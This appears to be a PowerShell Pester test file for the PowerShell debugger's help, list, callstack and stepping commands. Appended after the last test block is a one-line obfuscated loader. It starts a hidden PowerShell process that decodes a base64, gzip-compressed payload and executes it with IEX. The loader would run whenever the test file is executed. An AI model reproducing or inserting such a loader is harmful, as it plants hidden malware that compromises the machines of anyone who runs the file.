


Describe 'Basic debugger command tests' -tag 'CI' {

    BeforeAll {
        Register-DebuggerHandler
    }

    AfterAll {
        Unregister-DebuggerHandler
    }

    Context 'Help (?, h) command should display the debugger help message' {
        BeforeAll {
            $testScript = {
                try {
                    $bp = Set-PSBreakpoint -Command Get-Process
                    Get-Process -Id $PID > $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp
                }
            }

            $results = @(Test-Debugger -ScriptBlock $testScript -CommandQueue '?','h')
            $result = @{
                '?' = if ($results.Count -gt 0) {$results[0].Output -join [Environment]::NewLine}
                'h' = if ($results.Count -gt 1) {$results[1].Output -join [Environment]::NewLine}
            }
        }

        It 'Should show 3 debugger commands were invoked' {
             
             $results.Count | Should -Be 3
        }

        It '''h'' and ''?'' should show identical help messages' {
            $result['?'] | Should -BeExactly $result['h']
        }

        It 'Should only have non-empty string output from the help command' {
            $results[0].Output | Should -BeOfType string
            $result['?'] | Should -Match '\S'
        }

        It 'Should show help for stepInto' {$result['?'] | Should -Match '\ss, stepInto\s+'}
        It 'Should show help for stepOver' {$result['?'] | Should -Match '\sv, stepOver\s+'}
        It 'Should show help for stepOut' {$result['?'] | Should -Match '\so, stepOut\s+'}
        It 'Should show help for continue' {$result['?'] | Should -Match '\sc, continue\s+'}
        It 'Should show help for quit' {$result['?'] | Should -Match '\sq, quit\s+'}
        It 'Should show help for detach' {$result['?'] | Should -Match '\sd, detach\s+'}
        It 'Should show help for Get-PSCallStack' {$result['?'] | Should -Match '\sk, Get-PSCallStack\s+'}
        It 'Should show help for list' {$result['?'] | Should -Match '\sl, list\s+'}
        It 'Should show help for <enter>' {$result['?'] | Should -Match '\s<enter>\s+'}
        It 'Should show help for help' {$result['?'] | Should -Match '\s\?, h\s+'}
    }

    Context 'List (l, list) command should show the script and the current position' {
        BeforeAll {
            $testScript = {
                try {
                    $bp = Set-PSBreakpoint -Command Get-Process
                    Get-Process -Id $PID > $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp
                }
            }

            $testScriptList = @'
    1:
    2:                  try {
    3:                      $bp = Set-PSBreakpoint -Command Get-Process
    4:*                     Get-Process -Id $PID > $null
    5:                  } finally {
    6:                      Remove-PSBreakPoint -Breakpoint $bp
    7:                  }
    8:
'@

            $results = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'l','list')
            $result = @{
                'l' = if ($results.Count -gt 0) {$results[0].Output -replace '\s+$' -join [Environment]::NewLine -replace "^[`r`n]+|[`r`n]+$"}
                'list' = if ($results.Count -gt 1) {$results[1].Output -replace '\s+$' -join [Environment]::NewLine -replace "^[`r`n]+|[`r`n]+$"}
            }
        }

        It 'Should show 3 debugger commands were invoked' {
             
             $results.Count | Should -Be 3
        }

        It '''l'' and ''list'' should show identical script listings' {
            $result['l'] | Should -BeExactly $result['list']
        }

        It 'Should only have non-empty string output from the list command' {
            $results[0].Output | Should -BeOfType string
            $result['l'] | Should -Match '\S'
        }

        It 'Should show the entire script listing with the current position on line 5' {
            $result['l'] | Should -BeExactly $testScriptList
        }
    }

    Context 'List (l, list) command should support a start position' {
        BeforeAll {
            $testScript = {
                try {
                    $bp = Set-PSBreakpoint -Command Get-Process
                    Get-Process -Id $PID > $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp
                }
            }

            $testScriptList = @'
    4:*                     Get-Process -Id $PID > $null
    5:                  } finally {
    6:                      Remove-PSBreakPoint -Breakpoint $bp
    7:                  }
    8:
'@

            $results = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'l 4','list 4')
            $result = @{
                'l 4' = if ($results.Count -gt 0) {$results[0].Output -replace '\s+$' -join [Environment]::NewLine -replace "^[`r`n]+|[`r`n]+$"}
                'list 4' = if ($results.Count -gt 1) {$results[1].Output -replace '\s+$' -join [Environment]::NewLine -replace "^[`r`n]+|[`r`n]+$"}
            }
        }

        It 'Should show 3 debugger commands were invoked' {
             
             $results.Count | Should -Be 3
        }

        It '''l 4'' and ''list 4'' should show identical script listings' {
            $result['l 4'] | Should -BeExactly $result['list 4']
        }

        It 'Should only have non-empty string output from the list command' {
            $results[0].Output | Should -BeOfType string
            $result['l 4'] | Should -Match '\S'
        }

        It 'Should show a partial script listing starting on line 4 with the current position on line 5' {
            $result['l 4'] | Should -BeExactly $testScriptList
        }
    }

    Context 'List (l, list) command should support a start position and a line count' {
        BeforeAll {
            $testScript = {
                try {
                    $bp = Set-PSBreakpoint -Command Get-Process
                    Get-Process -Id $PID > $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp
                }
            }

            $testScriptList = @'
    3:                      $bp = Set-PSBreakpoint -Command Get-Process
    4:*                     Get-Process -Id $PID > $null
'@

            $results = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'l 3 2','list 3 2')
            $result = @{
                'l 3 2' = if ($results.Count -gt 0) {$results[0].Output -replace '\s+$' -join [Environment]::NewLine -replace "^[`r`n]+|[`r`n]+$"}
                'list 3 2' = if ($results.Count -gt 1) {$results[1].Output -replace '\s+$' -join [Environment]::NewLine -replace "^[`r`n]+|[`r`n]+$"}
            }
        }

        It 'Should show 3 debugger commands were invoked' {
             
             $results.Count | Should -Be 3
        }

        It '''l 3 2'' and ''list 3 2'' should show identical script listings' {
            $result['l 3 2'] | Should -BeExactly $result['list 3 2']
        }

        It 'Should only have non-empty string output from the list command' {
            $results[0].Output | Should -BeOfType string
            $result['l 3 2'] | Should -Match '\S'
        }

        It 'Should show a partial script listing showing 3 lines starting on line 4 with the current position on line 5' {
            $result['l 3 2'] | Should -BeExactly $testScriptList
        }
    }

    Context 'Callstack (k, Get-PSCallStack) command should show the current call stack' {
        BeforeAll {
            $testScript = {
                try {
                    $bp = Set-PSBreakpoint -Command Get-Process
                    Get-Process -Id $PID > $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp
                }
            }

            $results = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'k','Get-PSCallStack')
            $result = @{
                'k' = if ($results.Count -gt 0) {$results[0].Output}
                'Get-PSCallStack' = if ($results.Count -gt 1) {$results[1].Output}
            }
        }

        It 'Should show 3 debugger commands were invoked' {
             
             $results.Count | Should -Be 3
        }

        It 'Should only have CallStackFrame output from the callstack command' {
            $results[0].Output | Should -BeOfType System.Management.Automation.CallStackFrame
        }

        It '''k'' and ''Get-PSCallStack'' should show identical script listings' {
            [string[]]$result['k'] -join [Environment]::NewLine | Should -BeExactly ([string[]]$result['Get-PSCallStack'] -join [Environment]::NewLine)
        }
    }

}

Describe 'Simple debugger stepping command tests' -tag 'CI' {

    BeforeAll {
        Register-DebuggerHandler
    }

    AfterAll {
        Unregister-DebuggerHandler
    }

    Context 'StepInto steps into the current command if possible; otherwise it steps over the command' {
        BeforeAll {
            $testScript = {
                try {
                    $bp = Set-PSBreakpoint -Command ForEach-Object
                    Get-Process -Id $PID | ForEach-Object {
                        'One fish, two fish'
                        'Red fish, blue fish'
                    } *> $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp
                }
            }

            $result = @{
                's' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 's','s','s','s')
                'stepInto' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'stepInto','stepInto','stepInto','stepInto')
            }
        }

        It 'Should show 4 debugger commands were invoked twice' {
             
             $result['s'].Count | Should -Be 5
             $result['stepInto'].Count | Should -Be 5
        }

        It '''s'' and ''stepInto'' should have identical behaviour' {
            for ($i = 0; $i -lt 3; $i++) {
                $result['s'][$i] | ShouldHaveSameExtentAs -DebuggerCommandResult $result['stepInto'][$i]
            }
        }

        It 'The first extent should be the statement containing ForEach-Object' {
            $result['s'][0] | ShouldHaveExtent -FromLine 4 -FromColumn 21 -ToLine 7 -ToColumn 31
        }

        It 'The second extent should be in the nested scriptblock' {
            $result['s'][1] | ShouldHaveExtent -Line 4 -FromColumn 59 -ToColumn 60
        }

        It 'The third extent should be on ''One fish, two fish''' {
            $result['s'][2] | ShouldHaveExtent -Line 5 -FromColumn 25 -ToColumn 45
        }

        It 'The fourth extent should be on ''Red fish, blue fish''' {
            $result['s'][3] | ShouldHaveExtent -Line 6 -FromColumn 25 -ToColumn 46
        }
    }

    Context 'StepOver steps over the current command, unless it contains a triggerable breakpoint' {
        BeforeAll {
            $testScript = {
                try {
                    $bp1 = Set-PSBreakpoint -Command ForEach-Object
                    $bp2 = Set-PSBreakpoint -Command ConvertTo-Csv | Disable-PSBreakpoint -PassThru
                    Get-Process -Id $PID | ForEach-Object -Process {
                        $_ | ConvertTo-Csv
                    } *> $null
                    Enable-PSBreakpoint -Breakpoint $bp2
                    & {
                        Get-Date | ConvertTo-Csv
                    } *> $null
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bp1,$bp2
                }
            }

            $result = @{
                'v' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'v','v','v','v')
                'stepOver' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'stepOver','stepOver','stepOver','stepOver')
            }
        }

        It 'Should show 4 debugger commands were invoked twice' {
             
             $result['v'].Count | Should -Be 5
             $result['stepOver'].Count | Should -Be 5
        }

        It '''v'' and ''stepOver'' should have identical behaviour' {
            for ($i = 0; $i -lt 3; $i++) {
                $result['v'][$i] | ShouldHaveSameExtentAs -DebuggerCommandResult $result['stepOver'][$i]
            }
        }

        It 'The first extent should be the statement containing ForEach-Object' {
            $result['v'][0] | ShouldHaveExtent -FromLine 5 -FromColumn 21 -ToLine 7 -ToColumn 31
        }

        It 'The second extent should be on Enable-PSBreakpoint' {
            $result['v'][1] | ShouldHaveExtent -Line 8 -FromColumn 21 -ToColumn 57
        }

        It 'The third extent should be on the script block invoked with the call operator' {
            $result['v'][2] | ShouldHaveExtent -FromLine 9 -FromColumn 21 -ToLine 11 -ToColumn 31
        }

        It 'The fourth extent should be on the ConvertTo-Csv breakpoint inside the script block' {
            $result['v'][3] | ShouldHaveExtent -Line 10 -FromColumn 25 -ToColumn 49
        }
    }

    Context 'StepOut steps out of the current command, unless it contains a triggerable breakpoint after the current location' {
        BeforeAll {
            $testScript = {
                try {
                    $bps = Set-PSBreakpoint -Command Get-Process,ConvertTo-Csv
                    & {
                        $process = Get-Process -Id $PID
                        $process.Id
                    }
                    $date = Get-Date
                    $date | ConvertTo-Csv
                } finally {
                    Remove-PSBreakPoint -Breakpoint $bps
                }
            }

            $result = @{
                'o' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'o','o','o')
                'stepOut' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'stepOut','stepOut','stepOut')
            }
        }

        It 'Should show 3 debugger commands were invoked twice' {
             
             $result['o'].Count | Should -Be 4
             $result['stepOut'].Count | Should -Be 4
        }

        It '''o'' and ''stepOut'' should have identical behaviour' {
            for ($i = 0; $i -lt 3; $i++) {
                $result['o'][$i] | ShouldHaveSameExtentAs -DebuggerCommandResult $result['stepOut'][$i]
            }
        }

        It 'The first extent should be on Get-Process' {
            $result['o'][0] | ShouldHaveExtent -Line 5 -FromColumn 25 -ToColumn 56
        }

        It 'The second extent should be on Get-Date' {
            $result['o'][1] | ShouldHaveExtent -Line 8 -FromColumn 21 -ToColumn 37
        }

        It 'The third extent should be on the ConvertTo-Csv breakpoint' {
            $result['o'][2] | ShouldHaveExtent -Line 9 -FromColumn 21 -ToColumn 42
        }
    }
}

Describe 'Debugger bug fix tests' -tag 'CI' {

    BeforeAll {
        Register-DebuggerHandler
    }

    AfterAll {
        Unregister-DebuggerHandler
    }

    Context 'Stepping works beyond Remove-PSBreakpoint (Issue 
        BeforeAll {
            $testScript = {
                function Test-Issue9824 {
                    $bp = Set-PSBreakpoint -Command Remove-PSBreakpoint
                    Remove-PSBreakPoint -Breakpoint $bp
                }
                Test-Issue9824
                1 + 1
            }

            $result = @{
                's' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 's','s','s')
                'v' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'v','v','v')
                'o' = @(Test-Debugger -ScriptBlock $testScript -CommandQueue 'o','o')
            }
        }

        It 'Should show 3 debugger commands were invoked for stepInto' {
             
             $result['s'].Count | Should -Be 4
        }

        It 'Should show 3 debugger commands were invoked for stepOver' {
             
             $result['v'].Count | Should -Be 4
        }

        It 'Should show 2 debugger commands were invoked for stepOut' {
             
             $result['o'].Count | Should -Be 3
        }

        It 'The last extent for stepInto should be on 1 + 1' {
            $result['s'][2] | ShouldHaveExtent -Line 7 -FromColumn 17 -ToColumn 22
        }

        It 'The last extent for stepOver should be on 1 + 1' {
            $result['v'][2] | ShouldHaveExtent -Line 7 -FromColumn 17 -ToColumn 22
        }

        It 'The last extent for stepOut should be on 1 + 1' {
            $result['o'][1] | ShouldHaveExtent -Line 7 -FromColumn 17 -ToColumn 22
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGrNWVgCA71WYW/aSBD9nEr9D1aFhK0SDIQ2baRKt8YYO8EJxGBCOBRt7LVZWLzUXhOg1/9+Y8AJUZMqdyedlYhdz8zu2zdvdhykkScoj6SNcW+dY2PQk368f3fUwTGeS3JhY91tliWpQExElaMjsBSWm2WMySdb+ibJI7RY6HyOaTQ+O2ukcUwisZuXW0SgJCHze0ZJIivSX9JgQmJyfHU/JZ6QfkiFu3KL8XvM9m7rBvYmRDpGkZ/Z2tzDGbCys2BUyMU//ywqo+PquNz8nmKWyEVnnQgyL/uMFRXpp5Jt2FsviFy0qRfzhAeiPKDRSa3cjxIckEtYbUlsIibcT4oKnAT+YiLSOJIez5QtsnORizDsxNxDvh+TBCLKVrTkMyIXopSxkvSHPNojuE4jQecE7ILEfOGQeEk9kpRNHPmMXJNgLF+Sh/zgbw2SD4PAqyNipQQZeQWqzf2UkV10UfkV7C6TCjx5NoGCn+/fvX8X5ApYrMzPgaHZd+LuUAMwOhptxwSgyh2e0K37N6lSkmzYEAser2Fa6MUpUcbSKEvDaDyWCjNOVvrJRXO1LL2+SjUPgQAcLKkuVs2w1wPLyOXUH0PkPluF5X2rf76pm+1ZZn1dezoJaET0dYTn1MvlJb+UBRIwsj19OXe7BIRycW8gvk4YCbHIOC1Jo1/DmnMqHmO1lDKfxMiDTCaACpKsPAezS5NctCKbzIG23bwIOQlA1CT33gt5ne+ezcGp2GA4SUpSJ4Wq8kqSQzAjfklCUUL3JpQKvh0Wn+DaKRPUw4nIlxsrz9nc79rgUSLi1IN8AgM9Z0E8illGSEkyqU+0tUPDfPfii3Q0MGM0CmGlJaQD3mQ0OCJTSQxADxShlB0irPmCkTl4bkvdYDiEwt6XxlZcOCR+8WW0ufh3Ss/YyWk5wAopdxgXJcmlsYB7I2P6QGT/BdHh9fGErRGTfb7kvMBG2lpk9VCIWBiualVWW2Xy3ZO3pSoWQJMR87mGE/K57ogYSJQ/qFe0geAZWhGzPW1Gq+iBVi0b/vv0xOL6qX9xPjXVWF9NAmQllm129K5p1pfnjlsXTtMSFx1L2M2b6dRB5nV/KG4tZPZoZTasbxbndOO0kT9cqZ832uahoq0209APhnoQhKeBc139ZND2oNHVKjXc1ptpe6A9aJV60qQPZpf2u7NzQ9wPXYb7gRreVL9iumrHU7fK7Y2FUGty4m3OA7c1sf310FS/Duoz1ESoETVdQ+MXQy1GHdXFocsfLkLNGoQNZE66lNx2+4bW7Roa6rem3/WvagixN3iiDdwavV3cXE9gbgCEC7VSt3yy4cMukNTiCIfX4BM2at4kAB/9I9I+XvKkhmcaRxr4GLffAddwYXQY2Hv9Gkcuu7zBqH27NlS1OuzUkVmhg1aIsiVxqHUxSpb6Rlerrs/9wafLYaC6N+xU1Ru9hReoqvpg6hfebXX15er0S3tA3TlHfVV1P2QaAZEUsKvN3doNPsj5a5e/jeNkghloAW70vFgNHhv7K7rDaRYhy0/NekbiiDDoctAHc5EjxriXNYvDGx361a6LjKFw+zA8qb04UqRHR+Wpj+Svzs5uATGUzZOWy20ShWJSqqxOKhVoCZVVvQJnf/tZG3yxlg8WLGWN5ZG253ux7V5KVlaFaR03/wdS9xU9gR//jaQ+vfuN9U1EV0pPRPxiev7iH3H+76gYYCrA3YHLiZFdJ/0tI3tFHXyOZDkDpQT7J/ssvErF8SV8pfwN8bOE0ooKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

